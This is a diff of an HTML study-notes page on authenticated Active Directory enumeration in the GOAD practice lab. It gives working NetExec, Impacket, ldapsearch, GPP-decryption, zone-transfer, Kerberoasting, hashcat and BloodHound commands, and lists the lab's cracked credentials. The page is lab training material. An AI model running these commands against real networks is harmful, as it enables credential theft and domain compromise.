@@ -1,425 +1,226 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOAD Part 3 - Authenticated Enumeration | Mr Stark</title>
-    <meta name="description" content="Game of Active Directory - Part 3: Authenticated Enumeration">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
-    <style>
-        :root {
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #12121a;
-            --bg-tertiary: #1a1a24;
-            --bg-code: #1e1e2e;
-            --accent: #ff6b35;
-            --accent-hover: #ff8555;
-            --text-primary: #e0e0e0;
-            --text-secondary: #a0a0a0;
-            --text-muted: #707070;
-            --border: #2a2a3a;
-            --success: #4caf50;
-            --warning: #ff9800;
-            --error: #f44336;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-primary);
-            color: var(--text-primary);
-            line-height: 1.7;
-        }
-        .container {
-            display: flex;
-            min-height: 100vh;
-        }
-        .sidebar {
-            width: 300px;
-            background-color: var(--bg-secondary);
-            border-right: 1px solid var(--border);
-            padding: 2rem 1.5rem;
-            position: fixed;
-            height: 100vh;
-            overflow-y: auto;
-            z-index: 100;
-        }
-        .profile {
-            text-align: center;
-            margin-bottom: 2rem;
-            padding-bottom: 2rem;
-            border-bottom: 1px solid var(--border);
-        }
-        .avatar {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent), #ff8c5a);
-            margin: 0 auto 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: white;
-        }
-        .profile h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-        .profile p {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-        .nav-section {
-            margin-bottom: 2rem;
-        }
-        .nav-section h3 {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--text-muted);
-            margin-bottom: 1rem;
-        }
-        .nav-list {
-            list-style: none;
-        }
-        .nav-list li {
-            margin-bottom: 0.5rem;
-        }
-        .nav-list a {
-            display: block;
-            padding: 0.75rem 1rem;
-            color: var(--text-secondary);
-            text-decoration: none;
-            border-radius: 8px;
-            transition: all 0.2s;
-            font-size: 0.9rem;
-        }
-        .nav-list a:hover {
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-        }
-        .nav-list a.active {
-            background-color: var(--accent);
-            color: white;
-            font-weight: 600;
-        }
-        .main-content {
-            flex: 1;
-            margin-left: 300px;
-            padding: 3rem 4rem;
-            max-width: 1000px;
-        }
-        .content-header {
-            margin-bottom: 3rem;
-            padding-bottom: 2rem;
-            border-bottom: 1px solid var(--border);
-        }
-        .content-header h1 {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            color: var(--accent);
-        }
-        .content-header p {
-            color: var(--text-secondary);
-            font-size: 1.1rem;
-        }
-        .content-body h2 {
-            font-size: 1.75rem;
-            font-weight: 700;
-            margin: 2.5rem 0 1rem;
-            color: var(--accent);
-        }
-        .content-body h3 {
-            font-size: 1.4rem;
-            font-weight: 600;
-            margin: 2rem 0 1rem;
-            color: var(--text-primary);
-        }
-        .content-body h4 {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin: 1.5rem 0 0.75rem;
-            color: var(--text-secondary);
-        }
-        .content-body p {
-            margin-bottom: 1.25rem;
-            color: var(--text-primary);
-        }
-        .content-body code {
-            font-family: 'JetBrains Mono', monospace;
-            background-color: var(--bg-code);
-            padding: 0.2rem 0.5rem;
-            border-radius: 4px;
-            font-size: 0.9em;
-            color: var(--accent);
-        }
-        .content-body pre {
-            background-color: var(--bg-code);
-            padding: 1.5rem;
-            border-radius: 8px;
-            overflow-x: auto;
-            margin: 1.5rem 0;
-            border: 1px solid var(--border);
-        }
-        .content-body pre code {
-            background: none;
-            padding: 0;
-            color: var(--text-primary);
-            font-size: 0.85rem;
-            line-height: 1.6;
-        }
-        .content-body ul, .content-body ol {
-            margin: 1rem 0 1.5rem 2rem;
-        }
-        .content-body li {
-            margin-bottom: 0.5rem;
-        }
-        .content-body strong {
-            color: var(--accent);
-            font-weight: 600;
-        }
-        .content-body img {
-            max-width: 100%;
-            border-radius: 8px;
-            margin: 1.5rem 0;
-            border: 1px solid var(--border);
-        }
-        .content-body blockquote {
-            border-left: 4px solid var(--accent);
-            padding-left: 1.5rem;
-            margin: 1.5rem 0;
-            color: var(--text-secondary);
-            font-style: italic;
-        }
-        .content-body a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-        .content-body a:hover {
-            text-decoration: underline;
-        }
-        .content-body table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 1.5rem 0;
-        }
-        .content-body th, .content-body td {
-            padding: 0.75rem 1rem;
-            border: 1px solid var(--border);
-            text-align: left;
-        }
-        .content-body th {
-            background-color: var(--bg-tertiary);
-            font-weight: 600;
-        }
-        .content-body tr:nth-child(even) {
-            background-color: var(--bg-secondary);
-        }
-        .nav-footer {
-            margin-top: 3rem;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .nav-footer a {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-            text-decoration: none;
-            border-radius: 8px;
-            transition: all 0.2s;
-            border: 1px solid var(--border);
-        }
-        .nav-footer a:hover {
-            background-color: var(--accent);
-            color: white;
-            border-color: var(--accent);
-        }
-        .nav-footer .next {
-            margin-left: auto;
-        }
-        @media (max-width: 1024px) {
-            .sidebar {
-                width: 260px;
-            }
-            .main-content {
-                margin-left: 260px;
-                padding: 2rem;
-            }
-        }
-        @media (max-width: 768px) {
-            .sidebar {
-                display: none;
-            }
-            .main-content {
-                margin-left: 0;
-                padding: 1.5rem;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD Part 3 - Authenticated Enumeration | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
 </head>
+
 <body>
-    <div class="container">
-        <aside class="sidebar">
-            <div class="profile">
-                <div class="avatar">S</div>
-                <h1>Mr Stark</h1>
-                <p>GOAD Series</p>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png" alt="Mr Stark" width="80">
+        </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">Part 3: Auth Enum</p>
+        </div>
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
             </div>
-            <nav class="nav-section">
-                <h3>Navigation</h3>
-                <ul class="nav-list">
-                    <li><a href="index.html">Overview</a></li>
-                    <li><a href="part-1-lab-setup.html">Part 1: Lab Setup</a></li>
-                    <li><a href="part-2-finding-users.html">Part 2: Finding Users</a></li>
-                    <li><a href="part-3-authenticated-enumeration.html" class="active">Part 3: Authenticated Enum</a></li>
-                    <li><a href="part-4-ntlm-relaying.html">Part 4: NTLM Relaying</a></li>
-                    <li><a href="part-5-adcs.html">Part 5: ADCS</a></li>
-                    <li><a href="part-6-mssql.html">Part 6: MSSQL</a></li>
-                </ul>
-            </nav>
-        </aside>
-        <main class="main-content">
-            <div class="content-header">
-                <h1>GOAD Part 3 - Authenticated Enumeration</h1>
-                <p>We have successfully crossed the most difficult threshold in any Active Directory engagement - the transition from an unauthenticated outsider to a recognized security principal.</p>
+            <div class="contact-info">
+              <p class="contact-title">Previous</p>
+              <a href="part-2-finding-users.html" class="contact-link">Part 2: Finding Users</a>
             </div>
-            <div class="content-body">
-                <p>We have successfully crossed the most difficult threshold in any Active Directory engagement which is the transition from an unauthenticated outsider to a recognized security principal. By securing our first set of valid credentials through our previous exploitation of Kerberos and SMB weaknesses, we have moved into the "Insider Threat" territory of the engagement. Part 3 is dedicated to Enumeration With a Valid User, a phase where our primary objective is to peel back the layers of the SevenKingdoms forest from an authenticated perspective.</p>
+          </li>
 
-                <p>Having a valid domain account essentially turns the lights on within the network, allowing us to perform queries that are strictly forbidden to anonymous actors. During this stage of the operation, we are shifting our focus from discovering "who" exists in the domain to understanding exactly "how" the domain is built and governed.</p>
-
-                <h2>Enumerating Domain Users</h2>
-                <p>We have secured our initial foothold, and while our previous reconnaissance gave us a skeleton list of usernames, we must now leverage our authenticated session to flesh out the entire directory structure. It is essential to understand that this massive intake of information is possible because of a fundamental and often surprising built-in design philosophy of Active Directory that every beginner must master, by default, the <strong>Authenticated Users</strong> group has "Read" access to almost the entire directory.</p>
-
-                <h3>Enumerating Users with NetExec</h3>
-                <p>We utilize <strong>NetExec</strong> as our primary driver for this phase because its LDAP module is highly efficient at pulling comprehensive user lists while maintaining the authenticated context of our compromised account.</p>
-
-                <p><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' --users</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_1.png" alt="screenshot_1">
-
-                <p>The results of our NetExec SMB enumeration provide a perfect illustration of why even a simple directory dump is so critical to our methodology. We immediately gravitate toward the <strong>Description</strong> column because it represents a "Low-Hanging Fruit" scenario where administrative shortcuts lead directly to catastrophic security failures.</p>
-
-                <p>In the screenshot, we have uncovered a definitive "Critical" finding within the metadata for <strong>samwell.tarly</strong>. The description field explicitly states <code>Password : Heartsbane</code>.</p>
-
-                <h3>Enumerating Users with Impacket-GetADUsers</h3>
-                <p>While NetExec provides us with a high-level overview in an easily readable format, we frequently turn to <strong>impacket-GetADUsers</strong> when we need a more surgical, attribute-focused extraction of the user database.</p>
-
-                <p><code>impacketGetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_2.png" alt="screenshot_2">
-
-                <h3>Enumerating Users with ldapsearch</h3>
-                <p>We have established the foundational state where our authenticated identity, no matter how limited its role, allows us to systematically mine the Active Directory database.</p>
-
-                <p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'brandon.stark@north.sevenkingdoms.local' -w 'iseedeadpeople' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | grep 'distinguishedName:'</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_3.png" alt="screenshot_3">
-
-                <p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'brandon.stark@north.sevenkingdoms.local' -w 'iseedeadpeople' -b 'DC=north,DC=sevenkingdoms,DC=local' "*" | grep 'userPrincipalName:'</code></p>
-
-                <p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'brandon.stark@north.sevenkingdoms.local' -w 'iseedeadpeople' -b 'DC=north,DC=sevenkingdoms,DC=local' "*" | grep 'dn:'</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_4.png" alt="screenshot_4">
-
-                <h2>Tombstones Users Enumeration</h2>
-                <p>We are now shifting our attention to a fascinating area of Active Directory forensics that we treat as a "<strong>digital archaeology</strong>" phase of our engagement.</p>
-
-                <p><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'brandon.stark' -w 'iseedeadpeople' -b 'DC=north,DC=sevenkingdoms,DC=local' -E '1.2.840.113556.1.4.417' '(&(isDeleted=TRUE)(!(isRecycled=TRUE)))'</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_8.png" alt="screenshot_8">
-
-                <h2>Enumerating Shares</h2>
-                <p>We move forward from our successful identity mapping to one of the most operationally rewarding phases of our engagement, Authenticated Share Enumeration. Now that we hold a valid set of domain credentials, we have significantly higher visibility into the network's storage architecture.</p>
-
-                <h3>Enumerating shares with Netexec</h3>
-                <p>We utilize <strong>NetExec</strong> as our primary broad-scale scanner for this task, utilizing the <code>--shares</code> flag to systematically sweep the Domain Controllers and workstations.</p>
-
-                <p><code>poetry run netexec smb domains.txt -u 'jon.snow' -p 'iknownothing' --shares</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_11.png" alt="screenshot_11">
-
-                <p>We can use spidering capabilities to filter through the immense volume of data:</p>
-
-                <pre><code class="language-bash">poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'jon.snow' -p 'iknownothing' --spider 'IPC$' --pattern .ps1
-poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'jon.snow' -p 'iknownothing' --spider 'NETLOGON' --pattern .ps1
-poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'jon.snow' -p 'iknownothing' --spider 'SYSVOL' --pattern .ps1</code></pre>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_12.png" alt="screenshot_12">
-
-                <h2>GPP - Group Policy Preferences</h2>
-                <p>We now focus on one of the most historically significant yet persistent vulnerabilities within Active Directory environments, the <strong>Group Policy Preferences (GPP) cpassword</strong> flaw.</p>
-
-                <p>The key that unlocks every GPP password created before MS14-025 is:</p>
-                <p><code>4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b</code></p>
-
-                <p><code>poetry run netexec smb winterfell.north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' -M gpp_password</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_18.png" alt="screenshot_18">
-
-                <h2>Active Directory Integrated DNS Enumeration</h2>
-                <p>We shift our operational focus now from the exploitation of individual accounts and files to the macro-level mapping of the network infrastructure itself.</p>
-
-                <p><code>adidnsdump -u 'north.sevenkingdoms.local\\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_22.png" alt="screenshot_22">
-
-                <h2>Kerberoasting Attack</h2>
-                <p>We move now to one of the most effective and widely utilized escalation techniques in an Active Directory environment, Authenticated Kerberoasting.</p>
-
-                <h3>Enumerating Kerberoasting with NetExec</h3>
-                <p><code>poetry run netexec ldap 'winterfell.north.sevenkingdoms.local' -u 'brandon.stark' -p 'iseedeadpeople' -d 'north.sevenkingdoms.local' --kerberoasting KERBEROASTING</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_23.png" alt="screenshot_23">
-
-                <h3>Enumerating Kerberoasting with Impacket-GetUserSPNs</h3>
-                <p><code>impacket-GetUserSPNs -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local/brandon.stark:iseedeadpeople' -request -outputfile kerberoasting.txt</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_25.png" alt="screenshot_25">
-
-                <p><code>hashcat -m 13100 -a 0 KERBEROASTING /usr/share/wordlists/rockyou.txt.gz -O</code></p>
-
-                <img src="./game-of-active-directory/part-3-authenticated-enumeration/images/screenshot_26.png" alt="screenshot_26">
-
-                <h2>Valid Compromised Users</h2>
-                <ul>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (User Description)<br>
-                        <strong>User:</strong> samwell<br>
-                        <strong>Pass:</strong> Heartsbane</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (ASREP-Roasting)<br>
-                        <strong>User:</strong> brandon.stark<br>
-                        <strong>Pass:</strong> iseedeadpeople</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (Password Spray)<br>
-                        <strong>User:</strong> hodor<br>
-                        <strong>Pass:</strong> hodor</li>
-                    <li><strong>Domain:</strong> north.sevenkingdoms.local (Kerberoasting)<br>
-                        <strong>User:</strong> jon.snow<br>
-                        <strong>Pass:</strong> iknownothing</li>
-                </ul>
-
-                <h2>BloodHound</h2>
-                <p>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.</p>
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-forward-outline"></ion-icon>
             </div>
-            <div class="nav-footer">
-                <a href="part-2-finding-users.html">← Previous: Part 2</a>
-                <a href="part-4-ntlm-relaying.html" class="next">Next: Part 4 →</a>
+            <div class="contact-info">
+              <p class="contact-title">Next</p>
+              <a href="part-4-ntlm-relaying.html" class="contact-link">Part 4: NTLM Relay</a>
             </div>
-        </main>
+          </li>
+
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="list-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">All Parts</p>
+              <a href="index.html" class="contact-link">GOAD Overview</a>
+            </div>
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+
+      </div>
+
+    </aside>
+
+    <div class="main-content">
+
+      <nav class="navbar">
+        <ul class="navbar-list">
+          <li class="navbar-item">
+            <button class="navbar-link  active" data-nav-link>Part 3</button>
+          </li>
+        </ul>
+      </nav>
+
+      <article class="about active" data-page="about">
+
+        <header class="h2 article-title">Authenticated Enumeration</header>
+
+        <section class="about-text">
+
+<p>Now that we have obtained valid credentials, we transition from unauthenticated reconnaissance to authenticated enumeration. This phase allows us to query Active Directory with legitimate access, revealing significantly more detailed information about the domain structure, users, groups, computers, and potential attack paths.</p>
+
+<p>With authenticated access, we can perform deep LDAP queries, access file shares with proper permissions, and utilize powerful tools like BloodHound to map the domain's attack surface. This is where we begin to understand the true scope of the environment and identify high-value targets.</p>
+
+<h2>Enumerating Domain Users</h2>
+
+<p>With valid credentials, we can now query Active Directory for comprehensive user information. This includes account status, group memberships, password policies, and potentially sensitive information stored in user attributes like descriptions or notes.</p>
+
+<h3>Enumerating Users with NetExec</h3>
+
+<p>NetExec provides efficient enumeration capabilities once we have valid credentials. We can extract user lists, group memberships, and other domain information through authenticated SMB or LDAP queries.</p>
+
+<pre><code>netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --users
+netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --groups
+netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --loggedon-users</code></pre>
+
+<h3>Enumerating Users with Impacket-GetADUsers</h3>
+
+<p>Impacket's GetADUsers.py provides another powerful method for extracting user information from Active Directory via LDAP queries.</p>
+
+<pre><code>impacket-GetADUsers -all -dc-ip 10.4.10.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane</code></pre>
+
+<h3>Enumerating Users with ldapsearch</h3>
+
+<p>For more granular control over our queries, ldapsearch allows us to craft specific LDAP filters to extract exactly the information we need.</p>
+
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'north\samwell.tarly' -w 'Heartsbane' -b 'DC=north,DC=sevenkingdoms,DC=local' "(objectClass=user)" sAMAccountName | grep sAMAccountName</code></pre>
+
+<h2>Tombstones Users Enumeration</h2>
+
+<p>Tombstone objects are deleted Active Directory objects that remain in the database for a specified period (typically 60-180 days). These can contain valuable information about previously existing accounts, including their group memberships and permissions.</p>
+
+<pre><code>ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'north\samwell.tarly' -w 'Heartsbane' -b 'CN=Deleted Objects,DC=north,DC=sevenkingdoms,DC=local' "(objectClass=user)" -x</code></pre>
+
+<h2>Enumerating Shares</h2>
+
+<p>With valid credentials, we can now access SMB shares that were previously inaccessible. File shares often contain sensitive documents, configuration files, and other valuable data.</p>
+
+<h3>Enumerating shares with Netexec</h3>
+
+<pre><code>netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --shares</code></pre>
+
+<h3>Enumerating shares with Impacket-smbclient</h3>
+
+<p>Impacket's smbclient.py provides interactive access to SMB shares, allowing us to browse, download, and upload files.</p>
+
+<pre><code>impacket-smbclient north/samwell.tarly:Heartsbane@winterfell.north.sevenkingdoms.local</code></pre>
+
+<h2>GPP - Group Policy Preferences</h2>
+
+<p>Group Policy Preferences (GPP) is a feature that allows administrators to configure various Windows settings. Historically, these preferences sometimes contained encrypted passwords that could be decrypted by attackers. While modern Windows versions have patched this vulnerability, legacy GPP files may still exist in older environments.</p>
+
+<p>We search for Group Policy Preference XML files in the SYSVOL share, which is accessible to all authenticated domain users:</p>
+
+<pre><code>find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;</code></pre>
+
+<p>If found, we can decrypt the passwords using tools like gpp-decrypt:</p>
+
+<pre><code>gpp-decrypt "encrypted_password_here"</code></pre>
+
+<h2>Active Directory Integrated DNS Enumeration</h2>
+
+<p>Active Directory Integrated DNS zones often contain valuable information about the network topology, including server names, service locations, and even dynamic updates that reveal client systems.</p>
+
+<pre><code>dnsenum --dnsserver 10.4.10.11 north.sevenkingdoms.local
+dig @10.4.10.11 -t AXFR north.sevenkingdoms.local</code></pre>
+
+<h2>Kerberoasting Attack</h2>
+
+<p>Kerberoasting is an attack that targets Service Principal Names (SPNs) in Active Directory. Service accounts often have SPNs configured, and requesting tickets for these accounts provides us with encrypted data that we can attempt to crack offline.</p>
+
+<h3>Enumerating Kerberoasting with NetExec</h3>
+
+<pre><code>netexec ldap winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --kerberoasting kerberoastable.txt</code></pre>
+
+<h3>Enumerating Kerberoasting with Impacket-GetUserSPNs</h3>
+
+<pre><code>impacket-GetUserSPNs -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane -outputfile kerberoastable.txt</code></pre>
+
+<p>Once we have the tickets, we can crack them offline using Hashcat:</p>
+
+<pre><code>hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt -O</code></pre>
+
+<h2>ADCS Enumeration</h2>
+
+<p>Active Directory Certificate Services (ADCS) can provide additional attack vectors. We enumerate certificate templates, authorities, and potential misconfigurations.</p>
+
+<h2>Automation</h2>
+
+<p>Manual enumeration is time-consuming. We can automate much of this process using tools like BloodHound, which aggregates data from various sources and presents it in an easily digestible graph format.</p>
+
+<h2>BloodHound</h2>
+
+<p>BloodHound uses graph theory to reveal hidden relationships and attack paths in Active Directory. By collecting data from LDAP and other sources, it helps us identify the shortest path to Domain Admin privileges.</p>
+
+<pre><code>bloodhound-python -d north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' -c all -ns 10.4.10.11</code></pre>
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-2-finding-users.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">← Previous: Part 2</a>
+  <a href="part-4-ntlm-relaying.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 4 →</a>
+</div>
+
+        </section>
+
+      </article>
+
     </div>
-    <script>hljs.highlightAll();</script>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
 </body>
+
 </html>
